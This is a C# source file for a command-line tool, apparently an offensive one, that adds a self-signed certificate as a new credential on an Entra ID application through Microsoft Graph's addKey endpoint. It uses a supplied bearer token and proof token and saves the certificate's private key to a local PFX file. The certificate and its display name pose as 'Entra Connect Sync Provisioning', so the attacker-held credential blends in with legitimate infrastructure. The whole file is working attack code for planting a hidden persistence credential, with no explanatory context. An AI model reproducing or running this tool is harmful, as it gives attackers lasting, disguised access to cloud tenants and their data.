using System;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;

public class KeyCredentialModel
{
    // Token: 0x17000074 RID: 116
    // (get) Token: 0x0600018C RID: 396 RVA: 0x00006A45 File Offset: 0x00004C45
    // (set) Token: 0x0600018D RID: 397 RVA: 0x00006A4D File Offset: 0x00004C4D
    [JsonProperty("customKeyIdentifier")]
    public string CustomKeyIdentifier { get; set; }

    // Token: 0x17000075 RID: 117
    // (get) Token: 0x0600018E RID: 398 RVA: 0x00006A56 File Offset: 0x00004C56
    // (set) Token: 0x0600018F RID: 399 RVA: 0x00006A5E File Offset: 0x00004C5E
    [JsonProperty("displayName")]
    public string DisplayName { get; set; }

    // Token: 0x17000076 RID: 118
    // (get) Token: 0x06000190 RID: 400 RVA: 0x00006A67 File Offset: 0x00004C67
    // (set) Token: 0x06000191 RID: 401 RVA: 0x00006A6F File Offset: 0x00004C6F
    [JsonProperty("endDateTime")]
    public DateTimeOffset EndDateTime { get; set; }

    // Token: 0x17000077 RID: 119
    // (get) Token: 0x06000192 RID: 402 RVA: 0x00006A78 File Offset: 0x00004C78
    // (set) Token: 0x06000193 RID: 403 RVA: 0x00006A80 File Offset: 0x00004C80
    [JsonProperty("key")]
    public byte[] Key { get; set; }

    // Token: 0x17000078 RID: 120
    // (get) Token: 0x06000194 RID: 404 RVA: 0x00006A89 File Offset: 0x00004C89
    // (set) Token: 0x06000195 RID: 405 RVA: 0x00006A91 File Offset: 0x00004C91
    [JsonProperty("keyId")]
    public Guid? KeyId { get; set; }

    // Token: 0x17000079 RID: 121
    // (get) Token: 0x06000196 RID: 406 RVA: 0x00006A9A File Offset: 0x00004C9A
    // (set) Token: 0x06000197 RID: 407 RVA: 0x00006AA2 File Offset: 0x00004CA2
    [JsonProperty("startDateTime")]
    public DateTimeOffset StartDateTime { get; set; }

    // Token: 0x1700007A RID: 122
    // (get) Token: 0x06000198 RID: 408 RVA: 0x00006AAB File Offset: 0x00004CAB
    // (set) Token: 0x06000199 RID: 409 RVA: 0x00006AB3 File Offset: 0x00004CB3
    [JsonProperty("type")]
    public string Type { get; set; }

    // Token: 0x1700007B RID: 123
    // (get) Token: 0x0600019A RID: 410 RVA: 0x00006ABC File Offset: 0x00004CBC
    // (set) Token: 0x0600019B RID: 411 RVA: 0x00006AC4 File Offset: 0x00004CC4
    [JsonProperty("usage")]
    public string Usage { get; set; }
}

namespace AddSPKey
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            if (args.Length != 4)
            {
                Console.WriteLine("Usage: AddKeyUploader <BearerToken> <Proof> <AppId> <OutputFile>");
                return;
            }

            string bearerToken = args[0];
            string proof = args[1];
            string appId = args[2];
            string outputFile = args[3];

            // Generate the cert in memory
            var cert = CertFactory.CreateMinimalGraphCompatibleCert();

            // Save to disk
            File.WriteAllBytes(outputFile, cert.Export(X509ContentType.Pfx));
            Console.WriteLine($"[*] PFX saved to {outputFile}");

            // Construct the Graph API payload
            var keyId = Guid.NewGuid();

            KeyCredentialModel keyCredential = new KeyCredentialModel
            {
                Type = "AsymmetricX509Cert",
                Key = cert.GetRawCertData(),
                Usage = "Verify",
                StartDateTime = cert.NotBefore.ToUniversalTime(),
                EndDateTime = cert.NotAfter.ToUniversalTime(),
                DisplayName = "CN=Entra Connect Sync Provisioning",
            };

            string passwordCredential = null;


            string json = JsonConvert.SerializeObject((object)new { keyCredential, proof, passwordCredential });

            var client = new HttpClient();
            client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", bearerToken);

            string url = $"https://graph.microsoft.com/v1.0/applications(appId='{appId}')/addKey";

            var response = await client.PostAsync(
                url,
                new StringContent(json, Encoding.UTF8, "application/json")
            );

            if (response.IsSuccessStatusCode)
            {
                Console.WriteLine($"[*] Successfully added key: {cert.Thumbprint}");
            }
            else
            {
                var error = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[!] Failed to add key: {response.StatusCode}\n{error}");
            }
        }
    }

    public static class CertFactory
    {
        public static X509Certificate2 CreateMinimalGraphCompatibleCert()
        {
            using (RSA rsa = RSA.Create(2048))
            {
                var request = new CertificateRequest(
                    "CN=Entra Connect Sync Provisioning",
                    rsa,
                    HashAlgorithmName.SHA256,
                    RSASignaturePadding.Pkcs1);

                // Only add required extensions
                request.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(
                    new OidCollection { new Oid("1.3.6.1.5.5.7.3.2") }, // Client Authentication
                    critical: false));

                request.CertificateExtensions.Add(new X509KeyUsageExtension(
                    X509KeyUsageFlags.DigitalSignature, critical: false));

                // No Subject Key Identifier

                var cert = request.CreateSelfSigned(
                    DateTimeOffset.UtcNow.AddMinutes(-5),
                    DateTimeOffset.UtcNow.AddMonths(6));

                return new X509Certificate2(
                    cert.Export(X509ContentType.Pfx),
                    (string)null,
                    X509KeyStorageFlags.Exportable | X509KeyStorageFlags.EphemeralKeySet);
            }
        }
    }
}
